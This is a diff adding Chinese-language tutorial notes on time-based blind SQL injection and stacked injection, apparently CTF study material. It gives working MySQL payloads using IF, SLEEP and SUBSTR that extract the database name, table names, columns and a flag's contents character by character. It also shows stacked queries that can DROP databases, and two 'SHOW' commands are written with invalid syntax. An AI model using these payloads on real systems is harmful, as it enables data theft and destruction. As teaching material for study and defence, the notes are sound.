@@ -1,0 +1,78 @@
+什麼是時間型SQL 注入?
+Time-based sql injection 是指利用 SQL Injection 造成查詢時的時間延遲，透過時間差來洩漏資料庫中的資料。
+Time-based sql injection 和 Boolean-based 一樣屬於 blind injection，可以在完全網頁沒有回顯的情況下洩漏資料。
+優點：即使 True / False 都無法對網頁造成影響，Time-based 依然可以使用。
+缺點：由於網路本身會有延遲，因此 time-based sql injection 通常不能將延遲的時間設得過短，以免有 noise。而這就會需要較長的時間來洩漏資料。
+通常注入會先選擇：UNION > 報錯 > 布林盲注 > 時間盲注
+
+Q2. 時間型 SQL 注入手法
+適合數字型 SQL注入，否則就要使用跳脫搭配 IF 利用 SLEEP 可以造成延遲時間，搭配 IF 就可以輕易地洩漏出資料了。
+
+SLEEP(duration)：暫停 duration 秒
+IF(expr1, expr2, expr3) ：以 expr1 為條件，如果 expr1 為真，則回傳 expr2，反之回傳 expr3。
+
+判斷 database 名稱長度：
+
+IF(
+	LENGTH(database()) = 1, 
+	sleep(5),
+	666
+)
+此處用 database() 取得當前資料庫名稱，利用 LENGTH() 取得長度，再與 1 比較，若長度確實為 1 ，則延遲 5 秒。透過替換數字 1 ，可以爆搜資料庫長度。
+判斷 database 名字：
+
+IF(
+	SUBSTR(database(), 1, 1) = 'a', 
+	sleep(5),
+	666
+)
+此處用 SUBSTR 將資料庫名稱的第一個字元取出，與 a 相比較，若相等則延遲 5 秒，若不相等則替換為 b ，依此類推可以抱搜出第一個字元。
+接著再改為取第二個字元 SUBSTR(database(),2,1)，依此類推，直到找到所有字元。
+判斷 table 名稱：
+
+IF(
+	SUBSTR((
+		SELECT `table_name` 
+		FROM `information_schema`.`tables`
+		WHERE `table_schema` = database()
+		LIMIT 0, 1
+	), 1, 1) = 'a',
+	sleep(5),
+	666
+)
+LIMIT 0,1 也可以看作 LIMIT 1 OFFSET 0，從第0筆資料開始取1筆資料
+判斷欄位名稱：
+
+IF(
+	SUBSTR((
+		SELECT `column_name`
+		FROM `information_schema`.`columns`
+		WHERE `table_name` = 'flag'
+			AND `table_schema` = database()
+		LIMIT 0, 1
+	), 1, 1) = 'a',
+	sleep(5),	
+	666
+)
+判斷內容：
+
+IF(
+	SUBSTR(
+    	(SELECT `flag` FROM `CTF`.`flag` LIMIT 0, 1),
+	 1, 1) = 'a',
+	 sleep(5),
+	 666
+)
+
+Q1. 什麼是 堆疊型 SQL注入(stacked injection)?
+一般 SQL 注入都是 SELECT 語法，之前介紹 union 型 SQL 注入，也只能針對 SELECT 語句
+SQL 語法中分號可以用來表是一個 SQL語法結束，我們可以寫 SQL語法; SQL語法; SQL語法... ，這樣就能不局限於 SELECT 語法，可以做 CREATE、INSERT、DROP、RENAME、SHOW 等
+不過也要看是否受到 API、database、權限是否允許進行 stacked injection
+Q2. SQL 語法還能做什麼?
+創建資料庫 CREATE DATABASE 資料庫名
+刪掉資料庫 DROP DATABASE 資料庫名
+修改 table 名稱 RENAME TABLE 原資料表名 to 新資料表名
+查詢資料庫名 SHOW database()
+查詢資料表名 SHOW tables()
+
+
